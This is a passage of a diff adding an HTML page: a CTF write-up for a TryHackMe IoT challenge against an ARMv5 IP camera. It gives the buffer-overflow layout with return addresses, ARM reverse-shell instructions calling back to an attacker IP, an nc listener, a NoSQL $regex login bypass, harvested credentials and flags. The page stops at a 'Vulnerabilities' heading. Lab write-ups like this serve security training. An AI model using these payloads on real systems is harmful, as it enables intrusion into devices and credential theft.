@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup: Snowy ARMageddon | 0xb0rn3</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --black:      #000000;
+            --bg:         #0a0908;
+            --bg-card:    #141210;
+            --bg-code:    #1a1816;
+            --bg-raised:  #211f1c;
+
+            --gray-2:     #504945;
+            --gray-3:     #3c3836;
+            --gray-4:     #282828;
+
+            --fg:         #ebdbb2;
+            --fg-muted:   #a89984;
+            --fg-dim:     #665c54;
+            --white:      #fbf1c7;
+
+            --yellow:     #fabd2f;
+            --orange:     #fe8019;
+            --aqua:       #8ec07c;
+            --red:        #fb4934;
+            --blue:       #83a598;
+            --purple:     #d3869b;
+            --green:      #b8bb26;
+
+            --border:     rgba(235,219,178,.10);
+            --border-mid: rgba(235,219,178,.22);
+            --border-hi:  rgba(250,189,47,.5);
+
+            --glow-y:     0 0 30px rgba(250,189,47,.12);
+            --glow-r:     0 0 30px rgba(251,73,52,.10);
+
+            --r-xs:   6px;
+            --r-sm:   10px;
+            --r:      16px;
+            --r-lg:   20px;
+            --r-pill: 999px;
+        }
+
+        *, *::before, *::after {
+            margin: 0; padding: 0;
+            box-sizing: border-box;
+        }
+
+        ::selection { background: var(--yellow); color: var(--black); }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'IBM Plex Mono', 'JetBrains Mono', monospace;
+            background: var(--black);
+            color: var(--fg);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* Grain */
+        body::before {
+            content: '';
+            position: fixed; inset: 0; z-index: 0;
+            pointer-events: none; opacity: .03;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+            background-size: 256px;
+        }
+
+        /* Scanline */
+        body::after {
+            content: '';
+            position: fixed; inset: 0; z-index: 0;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.025) 2px, rgba(0,0,0,.025) 4px);
+        }
+
+        /* ── Scroll Progress ── */
+        .scroll-bar {
+            position: fixed; top: 0; left: 0;
+            width: 0%; height: 2px;
+            background: linear-gradient(90deg, var(--red), var(--orange), var(--yellow));
+            z-index: 9999;
+        }
+
+        /* ══════════════════════════════════
+           NAV
+        ══════════════════════════════════ */
+        .nav {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+            backdrop-filter: blur(20px);
+            background: rgba(0,0,0,.85);
+            border-bottom: 1px solid var(--border);
+            transition: all .3s;
+        }
+        .nav.scrolled {
+            background: rgba(0,0,0,.95);
+            box-shadow: 0 8px 32px rgba(0,0,0,.6);
+        }
+        .nav-inner {
+            max-width: 900px; margin: 0 auto;
+            padding: .65rem 1.5rem;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .nav-logo {
+            font-family: 'Orbitron', monospace;
+            font-size: .85rem; font-weight: 900;
+            color: var(--yellow);
+            text-decoration: none;
+            letter-spacing: 2px;
+            text-shadow: 0 0 20px rgba(250,189,47,.25);
+        }
+        .nav-logo:hover { color: var(--orange); }
+        .nav-logo .dim { color: var(--fg-dim); font-weight: 400; }
+
+        .nav-right {
+            display: flex; gap: .4rem; align-items: center;
+        }
+        .nav-btn {
+            color: var(--fg-dim);
+            text-decoration: none;
+            font-size: .62rem; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 1.5px;
+            padding: .35rem .7rem;
+            border-radius: var(--r-xs);
+            transition: all .2s;
+        }
+        .nav-btn:hover { color: var(--yellow); }
+        .nav-btn i { margin-right: .3rem; font-size: .58rem; }
+
+        /* ══════════════════════════════════
+           HERO BANNER
+        ══════════════════════════════════ */
+        .hero {
+            padding: 7rem 1.5rem 3rem;
+            text-align: center;
+            position: relative; z-index: 10;
+            border-bottom: 1px solid var(--border);
+            background: radial-gradient(ellipse at 50% 80%, rgba(251,73,52,.04), transparent 60%);
+        }
+
+        .hero-tag {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: rgba(251,73,52,.08);
+            border: 1px solid rgba(251,73,52,.25);
+            border-radius: var(--r-pill);
+            padding: 3px 12px;
+            font-size: .55rem; font-weight: 700;
+            color: var(--red);
+            text-transform: uppercase; letter-spacing: 2px;
+            margin-bottom: 1rem;
+            animation: fadeUp .6s .1s both;
+        }
+        .hero-tag .pulse {
+            width: 5px; height: 5px; border-radius: 50%;
+            background: var(--red);
+            box-shadow: 0 0 6px var(--red);
+            animation: blink 2s ease-in-out infinite;
+        }
+        @keyframes blink { 50% { opacity: .3; } }
+
+        .hero-title {
+            font-family: 'Orbitron', monospace;
+            font-size: clamp(1.4rem,4.5vw,2.2rem);
+            font-weight: 900; color: var(--white);
+            letter-spacing: .04em;
+            line-height: 1.2;
+            margin-bottom: .4rem;
+            animation: fadeUp .6s .2s both;
+        }
+        .hero-title .accent { color: var(--red); }
+
+        .hero-sub {
+            font-size: clamp(.62rem,1.6vw,.74rem);
+            color: var(--fg-dim);
+            letter-spacing: 1px;
+            margin-bottom: 1.2rem;
+            animation: fadeUp .6s .3s both;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Meta table */
+        .meta-grid {
+            display: inline-grid;
+            grid-template-columns: auto auto;
+            gap: .15rem 1.5rem;
+            text-align: left;
+            font-size: clamp(.6rem,1.5vw,.7rem);
+            background: var(--bg-card);
+            border: 1px solid var(--border-mid);
+            border-radius: var(--r);
+            padding: 1rem 1.4rem;
+            animation: fadeUp .6s .4s both;
+        }
+        .meta-key {
+            color: var(--fg-dim);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .meta-val { color: var(--fg); }
+        .meta-val.flag {
+            color: var(--aqua);
+            font-weight: 700;
+            background: rgba(142,192,124,.08);
+            padding: 0 6px;
+            border-radius: var(--r-xs);
+        }
+        .meta-val.severity {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        /* ══════════════════════════════════
+           ARTICLE LAYOUT
+        ══════════════════════════════════ */
+        .article {
+            max-width: 820px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            position: relative; z-index: 10;
+        }
+
+        .writeup-section {
+            padding: clamp(2rem,5vh,3.5rem) 0;
+            border-bottom: 1px solid var(--border);
+            opacity: 0; transform: translateY(16px);
+            transition: opacity .5s ease, transform .5s ease;
+        }
+        .writeup-section.visible {
+            opacity: 1; transform: translateY(0);
+        }
+        .writeup-section:last-child { border-bottom: none; }
+
+        /* Step header */
+        .step-header {
+            display: flex; align-items: center; gap: .7rem;
+            margin-bottom: 1rem;
+        }
+        .step-num {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: rgba(251,73,52,.12);
+            border: 1px solid rgba(251,73,52,.3);
+            display: flex; align-items: center; justify-content: center;
+            font-family: 'Orbitron', monospace;
+            font-size: .7rem; font-weight: 900;
+            color: var(--red);
+            flex-shrink: 0;
+        }
+        .step-title {
+            font-family: 'Orbitron', monospace;
+            font-size: clamp(.9rem,2.5vw,1.15rem);
+            font-weight: 700;
+            color: var(--white);
+            letter-spacing: .5px;
+        }
+        .step-label {
+            font-size: .55rem;
+            color: var(--fg-dim);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+
+        /* Prose */
+        .prose {
+            font-size: clamp(.72rem,1.8vw,.84rem);
+            color: var(--fg-muted);
+            line-height: 1.85;
+            margin-bottom: 1rem;
+        }
+        .prose strong { color: var(--fg); font-weight: 600; }
+        .prose code {
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-radius: var(--r-xs);
+            padding: 1px 6px;
+            font-size: .92em;
+            color: var(--yellow);
+        }
+        .prose a {
+            color: var(--blue);
+            text-decoration: none;
+            border-bottom: 1px solid rgba(131,165,152,.3);
+            transition: all .2s;
+        }
+        .prose a:hover { color: var(--yellow); border-color: var(--yellow); }
+
+        /* ── Code Blocks ── */
+        .code-block {
+            background: var(--bg-code);
+            border: 1px solid var(--border-mid);
+            border-radius: var(--r-sm);
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+        .code-bar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: .4rem .8rem;
+            background: rgba(40,40,40,.5);
+            border-bottom: 1px solid var(--border);
+        }
+        .code-lang {
+            font-size: .55rem;
+            color: var(--fg-dim);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+        }
+        .code-copy {
+            background: none; border: none;
+            color: var(--fg-dim);
+            font-size: .55rem; font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 2px 6px;
+            border-radius: var(--r-xs);
+            transition: all .2s;
+            font-family: inherit;
+        }
+        .code-copy:hover { color: var(--yellow); }
+        .code-copy.copied { color: var(--aqua); }
+
+        .code-body {
+            padding: .8rem 1rem;
+            overflow-x: auto;
+            font-size: clamp(.62rem,1.5vw,.73rem);
+            line-height: 1.7;
+            tab-size: 4;
+        }
+        .code-body pre {
+            margin: 0;
+            white-space: pre;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* Syntax colors */
+        .kw  { color: var(--red); }
+        .fn  { color: var(--yellow); }
+        .str { color: var(--aqua); }
+        .cmt { color: var(--fg-dim); font-style: italic; }
+        .num { color: var(--purple); }
+        .op  { color: var(--orange); }
+        .out { color: var(--aqua); }
+        .dim { color: var(--fg-dim); }
+        .path { color: var(--blue); }
+        .flag-hl { color: var(--aqua); font-weight: 700; background: rgba(142,192,124,.1); padding: 0 4px; border-radius: 3px; }
+
+        /* ── Response/Output Block ── */
+        .response-block {
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--aqua);
+            border-radius: var(--r-xs);
+            padding: .7rem 1rem;
+            margin: .8rem 0;
+            font-size: clamp(.62rem,1.5vw,.72rem);
+            line-height: 1.7;
+        }
+
+        /* ── Attack Chain Diagram ── */
+        .chain-wrap {
+            margin: 1.5rem 0;
+        }
+        .chain-step {
+            display: flex; gap: .8rem;
+            align-items: flex-start;
+            position: relative;
+            padding-bottom: 1.2rem;
+        }
+        .chain-step:last-child { padding-bottom: 0; }
+        .chain-step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            left: 14px; top: 30px; bottom: 0;
+            width: 1px;
+            background: linear-gradient(to bottom, var(--red), rgba(251,73,52,.15));
+        }
+
+        .chain-dot {
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            background: var(--bg-card);
+            border: 2px solid var(--red);
+            display: flex; align-items: center; justify-content: center;
+            font-size: .6rem; font-weight: 900;
+            color: var(--red);
+            flex-shrink: 0;
+            z-index: 1;
+            font-family: 'Orbitron', monospace;
+        }
+        .chain-dot.final {
+            background: var(--red);
+            color: var(--black);
+            box-shadow: 0 0 12px rgba(251,73,52,.3);
+        }
+
+        .chain-info { flex: 1; }
+        .chain-label {
+            font-size: .65rem;
+            font-weight: 700;
+            color: var(--fg);
+            margin-bottom: .15rem;
+        }
+        .chain-detail {
+            font-size: .6rem;
+            color: var(--fg-dim);
+            line-height: 1.5;
+        }
+        .chain-detail code {
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            padding: 0 4px;
+            border-radius: 3px;
+            color: var(--yellow);
+            font-size: .58rem;
+        }
+
+        /* ── Vulnerability Table ── */
+        .vuln-table-wrap {
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: clamp(.58rem,1.4vw,.68rem);
+        }
+        .vuln-table th {
+            background: var(--bg-raised);
+            color: var(--fg-dim);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-size: .55rem;
+            padding: .55rem .7rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border-mid);
+        }
+        .vuln-table td {
+            padding: .55rem .7rem;
+            border-bottom: 1px solid var(--border);
+            color: var(--fg-muted);
+            vertical-align: top;
+        }
+        .vuln-table tr:hover td { background: rgba(250,189,47,.02); }
+        .sev-crit { color: var(--red); font-weight: 700; }
+        .sev-high { color: var(--orange); font-weight: 700; }
+        .sev-med  { color: var(--yellow); font-weight: 700; }
+        .sev-low  { color: var(--blue); font-weight: 600; }
+
+        /* ── Takeaway Cards ── */
+        .takeaway-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: .7rem;
+            margin: 1rem 0;
+        }
+        .takeaway {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--r-sm);
+            padding: .8rem 1rem;
+            transition: all .25s;
+        }
+        .takeaway:hover {
+            border-color: var(--border-mid);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,0,0,.3);
+        }
+        .takeaway-icon {
+            font-size: .85rem;
+            margin-bottom: .4rem;
+        }
+        .takeaway-text {
+            font-size: clamp(.6rem,1.4vw,.7rem);
+            color: var(--fg-muted);
+            line-height: 1.6;
+        }
+        .takeaway-text strong { color: var(--fg); }
+
+        /* ── Exploit Script Section ── */
+        .exploit-header {
+            display: flex; align-items: center; justify-content: space-between;
+            flex-wrap: wrap; gap: .5rem;
+            margin-bottom: 1rem;
+        }
+        .exploit-title-group {
+            display: flex; align-items: center; gap: .7rem;
+        }
+        .exploit-icon {
+            width: 36px; height: 36px;
+            border-radius: var(--r-sm);
+            background: rgba(250,189,47,.1);
+            border: 1px solid rgba(250,189,47,.25);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--yellow);
+            font-size: .9rem;
+        }
+        .gh-link {
+            display: inline-flex; align-items: center; gap: .4rem;
+            font-size: .6rem; font-weight: 700;
+            color: var(--blue);
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: .3rem .7rem;
+            border: 1px solid rgba(131,165,152,.25);
+            border-radius: var(--r-pill);
+            transition: all .2s;
+        }
+        .gh-link:hover { background: var(--blue); color: var(--black); }
+
+        /* ── Flag Captured Banner ── */
+        .flag-banner {
+            background: rgba(142,192,124,.06);
+            border: 1px solid rgba(142,192,124,.25);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            text-align: center;
+            margin: 1.5rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .flag-banner::before {
+            content: '';
+            position: absolute; inset: 0;
+            background: radial-gradient(circle at 50% 50%, rgba(142,192,124,.06), transparent 70%);
+        }
+        .flag-label {
+            font-size: .55rem;
+            color: var(--aqua);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 700;
+            margin-bottom: .3rem;
+        }
+        .flag-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: clamp(1rem,3vw,1.4rem);
+            font-weight: 700;
+            color: var(--aqua);
+            text-shadow: 0 0 20px rgba(142,192,124,.25);
+            letter-spacing: 1px;
+            position: relative;
+        }
+
+        /* ── Footer ── */
+        .footer {
+            border-top: 1px solid var(--border);
+            background: var(--bg-card);
+            padding: 1.5rem;
+            text-align: center;
+            position: relative; z-index: 10;
+        }
+        .footer-text {
+            font-size: .58rem;
+            color: var(--fg-dim);
+            letter-spacing: 1.5px;
+        }
+        .footer-text span { color: var(--yellow); }
+
+        /* ── Scroll Top ── */
+        .scroll-top {
+            position: fixed; bottom: 1.2rem; right: 1.2rem; z-index: 1000;
+            width: 36px; height: 36px;
+            border-radius: var(--r-sm);
+            background: var(--bg-card);
+            color: var(--yellow);
+            border: 1px solid var(--border-mid);
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; font-size: .75rem;
+            opacity: 0; pointer-events: none;
+            transition: all .25s;
+        }
+        .scroll-top.show { opacity: 1; pointer-events: auto; }
+        .scroll-top:hover { background: var(--yellow); color: var(--black); }
+
+        /* ── Scrollbar ── */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--black); }
+        ::-webkit-scrollbar-thumb { background: var(--gray-2); border-radius: 99px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--yellow); }
+
+        /* ── Responsive ── */
+        @media (max-width: 600px) {
+            .meta-grid { grid-template-columns: 1fr; gap: .3rem; }
+            .takeaway-grid { grid-template-columns: 1fr; }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="scroll-bar" id="scrollBar"></div>
+
+    <nav class="nav" id="navbar">
+        <div class="nav-inner">
+            <a href="index.html" class="nav-logo"><span class="dim">[</span>0xb0rn3<span class="dim">]</span></a>
+            <div class="nav-right">
+                <a href="index.html" class="nav-btn"><i class="fas fa-home"></i>Home</a>
+                <a href="CTF.html" class="nav-btn"><i class="fas fa-trophy"></i>All CTFs</a>
+                <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/Snowy_ARMageddon" target="_blank" class="nav-btn"><i class="fab fa-github"></i>Repo</a>
+            </div>
+        </div>
+    </nav>
+
+    <header class="hero">
+        <div class="hero-tag"><span class="pulse"></span>CTF Writeup</div>
+        <h1 class="hero-title">Snowy <span class="accent">ARMageddon</span></h1>
+        <p class="hero-sub">TryHackMe &middot; AoC 2023 Side Quest &middot; Insane &middot; by 0xb0rn3</p>
+        <div class="meta-grid">
+            <span class="meta-key">Platform</span>  <span class="meta-val">TryHackMe &mdash; Advent of Cyber 2023</span>
+            <span class="meta-key">Category</span>  <span class="meta-val">IoT / Binary Exploitation / NoSQL Injection</span>
+            <span class="meta-key">Difficulty</span> <span class="meta-val severity" style="color:var(--red);font-weight:900;">Insane</span>
+            <span class="meta-key">Target</span>     <span class="meta-val"><code>10.112.147.128</code></span>
+            <span class="meta-key">Stack</span>       <span class="meta-val">ARMv5 IP Camera (Trivision NC-227WF) / PHP 8.1.26 / MongoDB</span>
+            <span class="meta-key">Flags</span>       <span class="meta-val flag">2 flags captured</span>
+        </div>
+    </header>
+
+    <main class="writeup">
+
+        <!-- OVERVIEW -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">0</div>
+                <div><div class="step-label">Context</div><h2 class="step-title">Overview</h2></div>
+            </div>
+            <p>
+                An Insane-rated IoT exploitation challenge targeting a Trivision NC-227WF HD IP camera
+                on ARMv5 architecture. The chain: port knocking via full nmap sweep, a stack-based
+                buffer overflow in the camera&rsquo;s embedded web server with custom ARM shellcode
+                (bad character avoidance), credential harvesting from firmware, reading the flag from
+                a live MJPEG camera feed, then NoSQL injection against a MongoDB-backed PHP app for
+                the second key.
+            </p>
+            <div class="code-block"><div class="code-bar"><span class="code-lang">ATTACK CHAIN</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre>nmap -p- &rarr; ports 22, 8080, 23(filtered), 50628
+  &darr;
+nmap full sweep accidentally triggers knockd &rarr; port 23 opens briefly
+  &darr;
+Trivision NC-227WF buffer overflow (port 50628)
+  GET /en/login.asp?basic=[A&times;280][SLEEP][BX_SP][ARM_SHELLCODE]
+  &darr;
+ARMv5 reverse shell &rarr; /var/etc/umconfig.txt &rarr; admin:Y3tiStarCur!ous
+  &darr;
+Camera MJPEG stream &rarr; flag1: THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}
+  &darr;
+NoSQL injection (port 8080) &rarr; username[$regex]=.*
+  &darr;
+yetikey2.txt: 2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</pre></div>
+        </section>
+
+        <!-- STEP 1 &mdash; RECON -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num">1</div><div><div class="step-label">Reconnaissance</div><h2 class="step-title">Port Scan &amp; Camera Fingerprinting</h2></div></div>
+            <div class="code-block"><div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cmd-p">$</span> sudo nmap -sV -sC -p- --open -T4 10.112.147.128</pre></div>
+            <div class="vuln-table-wrap"><table class="vuln-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+                <tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH</td><td>Standard</td></tr>
+                <tr><td><code>23/tcp</code></td><td>Telnet</td><td>&mdash;</td><td style="color:var(--yellow);">Filtered &mdash; knockd protected</td></tr>
+                <tr><td><code>8080/tcp</code></td><td>HTTP</td><td>PHP 8.1.26</td><td>403 on /login.php (trailing slash bypass)</td></tr>
+                <tr><td><code>50628/tcp</code></td><td>HTTP</td><td>Trivision webs</td><td style="color:var(--red);">IP camera &mdash; ARMv5 buffer overflow target</td></tr>
+            </tbody></table></div>
+            <p>Port 50628 serves the <strong>Trivision NC-227WF</strong> camera login &mdash; an embedded ARMv5 Linux device with a custom <code>webs</code> HTTP server. Port 8080 hosts a PHP/MongoDB app with a 403 bypass via trailing slash.</p>
+        </section>
+
+        <!-- STEP 2 &mdash; PORT KNOCK -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num">2</div><div><div class="step-label">Port Knock Bypass</div><h2 class="step-title">nmap Sweep Triggers knockd</h2></div></div>
+            <p>Port 23 is protected by <code>knockd</code>. The knock sequence spans the full 65535-port range &mdash; but a full nmap scan (<code>-p-</code>) sequentially probes every port, <strong>accidentally triggering the knock sequence</strong> as it sweeps.</p>
+            <div class="code-block"><div class="code-bar"><span class="code-lang">PYTHON &mdash; PORT POLL</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre><span style="color:var(--fg3);"># Run nmap -p- in background, poll port 23 at ~0.3s intervals</span>
+while True:
+    s = socket.socket()
+    s.settimeout(0.5)
+    if s.connect_ex(("10.112.147.128", 23)) == 0:
+        data = s.recv(4096)   <span style="color:var(--fg3);"># banner with camera creds</span>
+        break
+    time.sleep(0.3)</pre></div>
+            <p>When the port briefly opens, the telnet banner delivers camera credentials from <code>/var/etc/umconfig.txt</code>.</p>
+        </section>
+
+        <!-- STEP 3 &mdash; BUFFER OVERFLOW -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num">3</div><div><div class="step-label">Binary Exploitation</div><h2 class="step-title">ARMv5 Stack Buffer Overflow</h2></div></div>
+            <p>The camera&rsquo;s <code>webs</code> server has a stack-based buffer overflow in the <code>basic=</code> GET parameter of <code>/en/login.asp</code>. No ASLR on the device &mdash; library addresses are static.</p>
+
+            <div class="meta-grid" style="margin: .8rem 0;">
+                <span class="meta-key">Arch</span>       <span class="meta-val">ARMv5TEJ (little-endian)</span>
+                <span class="meta-key">Vuln</span>       <span class="meta-val">Stack BOF in <code>basic=</code> parameter (&gt;256 bytes)</span>
+                <span class="meta-key">PC offset</span>  <span class="meta-val"><code>284</code> bytes</span>
+                <span class="meta-key">Bad chars</span>  <span class="meta-val"><code>\x00 \x09 \x0a \x0d \x20 \x23 \x26</code></span>
+                <span class="meta-key">ASLR</span>       <span class="meta-val" style="color:var(--red);font-weight:700;">None &mdash; static library addresses</span>
+            </div>
+
+            <div class="vuln-table-wrap"><table class="vuln-table"><thead><tr><th>Register</th><th>Offset</th><th>Value</th></tr></thead><tbody>
+                <tr><td><code>r4</code></td><td>256</td><td>Padding</td></tr>
+                <tr><td><code>r10</code></td><td>280</td><td><code>0x4002EC54</code> &mdash; <code>sleep()</code> (libc)</td></tr>
+                <tr><td><code>pc</code></td><td>284</td><td><code>0x40010F88</code> &mdash; <code>bx sp</code> (libgcc_s)</td></tr>
+                <tr><td><code>sp</code></td><td>288</td><td>Shellcode starts here</td></tr>
+            </tbody></table></div>
+
+            <div class="code-block"><div class="code-bar"><span class="code-lang">BUFFER LAYOUT</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre>[A &times; 280] [p32(0x4002EC54)] [p32(0x40010F88)] [ARM SHELLCODE]
+             sleep() in r10      bx sp &rarr; jump to stack</pre></div>
+
+            <p><strong>ARM shellcode</strong> implements a reverse TCP shell. IP/port bytes encoded with <code>mov/lsl/add</code> sequences to avoid bad characters:</p>
+
+            <div class="code-block"><div class="code-bar"><span class="code-lang">ARM &mdash; IP ENCODING (192.168.158.186)</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre>mov  r1, #0xBA       <span style="color:var(--fg3);">; 186</span>
+lsl  r1, r1, #8
+add  r1, r1, #0x9E   <span style="color:var(--fg3);">; 158</span>
+lsl  r1, r1, #8
+add  r1, r1, #0xA8   <span style="color:var(--fg3);">; 168</span>
+lsl  r1, r1, #8
+add  r1, r1, #0xC0   <span style="color:var(--fg3);">; 192</span>
+str  r1, [sp, #4]    <span style="color:var(--fg3);">; store in sockaddr struct</span></pre></div>
+
+            <div class="code-block"><div class="code-bar"><span class="code-lang">REVERSE SHELL</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cmd-p">$</span> nc -lvnp 4444
+<span class="out-line">Connection from 10.112.147.128</span>
+
+<span class="cmd-p">#</span> cat /proc/cpuinfo | grep "CPU architecture"
+<span class="out-line">CPU architecture: 5TEJ   (ARMv5)</span>
+
+<span class="cmd-p">#</span> cat /var/etc/umconfig.txt
+<span class="out-line">name=admin</span>
+<span class="out-line" style="color:var(--aqua);font-weight:600;">password=Y3tiStarCur!ous</span></pre></div>
+        </section>
+
+        <!-- STEP 4 &mdash; FLAG 1 -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num">4</div><div><div class="step-label">Flag 1</div><h2 class="step-title">Camera MJPEG Stream &rarr; Visual Flag</h2></div></div>
+            <p>Login to the camera web interface at <code>http://10.112.147.128:50628/en/login.asp</code> with <code>admin:Y3tiStarCur!ous</code>. Navigate to the live MJPEG stream at <code>/en/player/mjpeg_vga.asp</code> &mdash; the camera is pointed at a display showing the flag:</p>
+            <div class="flag-banner"><div class="flag-label"><i class="fas fa-flag"></i> &nbsp;Flag 1</div><div class="flag-value">THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}</div></div>
+        </section>
+
+        <!-- STEP 5 &mdash; NOSQL -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num">5</div><div><div class="step-label">NoSQL Injection</div><h2 class="step-title">MongoDB Auth Bypass &rarr; yetikey2.txt</h2></div></div>
+            <p>Port 8080 serves a PHP/MongoDB login form. Direct access returns 403 &mdash; bypassed with a trailing slash: <code>/login.php/</code>.</p>
+            <div class="code-block"><div class="code-bar"><span class="code-lang">PYTHON &mdash; NoSQL INJECTION</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+<pre>s = requests.Session()
+r = s.post("http://10.112.147.128:8080/login.php/",
+    data={
+        <span style="color:var(--red);font-weight:700;">"username[$regex]"</span>: ".*",
+        <span style="color:var(--red);font-weight:700;">"password[$regex]"</span>: ".*"
+    })
+<span class="out-line" style="color:var(--aqua);">&rarr; 302 redirect &mdash; authenticated</span>
+
+<span class="cmd-p">$</span> curl -b "PHPSESSID=&lt;session&gt;" http://10.112.147.128:8080/yetikey2.txt
+<span class="out-line" style="color:var(--aqua);font-weight:600;">2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</span></pre></div>
+            <div class="flag-banner"><div class="flag-label"><i class="fas fa-key"></i> &nbsp;yetikey2.txt</div><div class="flag-value">2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</div></div>
+        </section>
+
+        <!-- ATTACK CHAIN -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num"><i class="fas fa-link" style="font-size:.55rem"></i></div><div><div class="step-label">Visualization</div><h2 class="step-title">Attack Chain</h2></div></div>
+            <div class="chain-wrap">
+                <div class="chain-step"><div class="chain-dot">1</div><div class="chain-info"><div class="chain-label">Port Knock via nmap Sweep</div><div class="chain-detail"><code>nmap -p-</code> triggers knockd sequence &rarr; port 23 opens &rarr; camera credentials</div></div></div>
+                <div class="chain-step"><div class="chain-dot">2</div><div class="chain-info"><div class="chain-label">ARMv5 Stack Buffer Overflow</div><div class="chain-detail"><code>basic=</code> parameter &rarr; ROP: <code>sleep()</code> + <code>bx sp</code> &rarr; ARM reverse shell</div></div></div>
+                <div class="chain-step"><div class="chain-dot">3</div><div class="chain-info"><div class="chain-label">Camera Credential Harvest</div><div class="chain-detail"><code>/var/etc/umconfig.txt</code> &rarr; <code>admin:Y3tiStarCur!ous</code></div></div></div>
+                <div class="chain-step"><div class="chain-dot">4</div><div class="chain-info"><div class="chain-label">MJPEG Stream &rarr; Flag 1</div><div class="chain-detail">Live camera feed shows flag &rarr; <span class="flag-hl">THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}</span></div></div></div>
+                <div class="chain-step"><div class="chain-dot final"><i class="fas fa-key" style="font-size:.5rem"></i></div><div class="chain-info"><div class="chain-label">NoSQL Injection &rarr; yetikey2</div><div class="chain-detail"><code>$regex: .*</code> auth bypass &rarr; <span class="flag-hl">2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</span></div></div></div>
+            </div>
+        </section>
+
+        <!-- VULNERABILITIES -->
+        <section class="writeup-section">
+            <div class="step-header"><div class="step-num"><i class="fas fa-bug" style="font-size:.55rem"></i></div><div><div class="step-label">Assessment</div><h2 class="step-title">Vulnerabilities</h2></div></div>
